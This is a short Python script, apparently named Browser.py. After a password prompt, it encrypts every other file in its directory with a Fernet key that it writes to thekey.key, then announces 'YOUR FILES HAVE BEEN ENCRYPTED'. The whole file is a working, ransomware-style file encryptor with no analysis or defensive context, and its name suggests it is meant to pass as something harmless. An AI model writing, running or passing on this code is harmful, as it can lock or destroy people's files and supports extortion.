import os
from cryptography.fernet import Fernet



#Getting files in directory

files = []



for file in os.listdir():
	if file == "Browser.py" or file == "thekey.key" or file == "Decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

def check():
	global files
	print('This will encrypt the following files...')
	print(files)
	print("Are you sure you would like to do this??")
	CHECK = str(input("Insert key: "))
	if CHECK != "mozartjajaLOL":
		exit()
	else:
		return CHECK


check()

key = Fernet.generate_key()


with open("thekey.key", "wb") as thekey:
	thekey.write(key)
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
print(f"YOUR FILES HAVE BEEN ENCRYPTED {files}")
